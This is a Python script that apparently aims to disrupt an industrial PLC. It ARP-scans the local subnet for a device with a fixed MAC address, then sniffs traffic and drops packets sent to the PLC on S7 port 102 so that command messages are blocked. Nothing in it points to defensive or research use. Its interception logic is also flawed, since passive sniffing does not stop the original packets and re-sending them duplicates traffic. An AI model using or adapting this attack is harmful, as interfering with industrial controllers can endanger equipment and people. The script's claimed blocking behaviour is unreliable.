import scapy.all as scapy
import netifaces as ni
import time

# Function to get the PLC's IP address
def get_plc_ip():
    # Assuming the PLC is on the same network as the Windows machine
    # Get the IP address of the Windows machine
    interfaces = ni.interfaces()
    for interface in interfaces:
        addrs = ni.ifaddresses(interface)
        if ni.AF_INET in addrs:
            ip = addrs[ni.AF_INET][0]['addr']
            if ip != '127.0.0.1':
                # Perform a network scan to find the PLC
                print(f"Scanning network for PLC on {ip}/24")
                arp_request = scapy.ARP(pdst=f"{ip}/24")
                broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                arp_request_broadcast = broadcast / arp_request
                answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
                for element in answered_list:
                    print(f"Device found: {element[1].psrc} - {element[1].hwsrc}")
                    # Assuming the PLC has a specific MAC address or IP address
                    # For example, if the PLC's MAC address is known
                    if element[1].hwsrc == "00:11:22:33:44:55":
                        return element[1].psrc
    return None

# Function to block command messages
def block_command_message(plc_ip):
    def packet_callback(packet):
        if packet.haslayer(scapy.IP) and packet[scapy.IP].dst == plc_ip:
            if packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 102:  # S7 protocol port
                print(f"Blocking command message to {plc_ip}")
                return
        scapy.sendp(packet, iface="eth0")  # Forward the packet

    # Start sniffing the network
    scapy.sniff(iface="eth0", prn=packet_callback, store=0)

if __name__ == "__main__":
    plc_ip = get_plc_ip()
    if plc_ip:
        print(f"PLC IP address found: {plc_ip}")
        block_command_message(plc_ip)
    else:
        print("PLC IP address not found. Please ensure the PLC is on the same network.")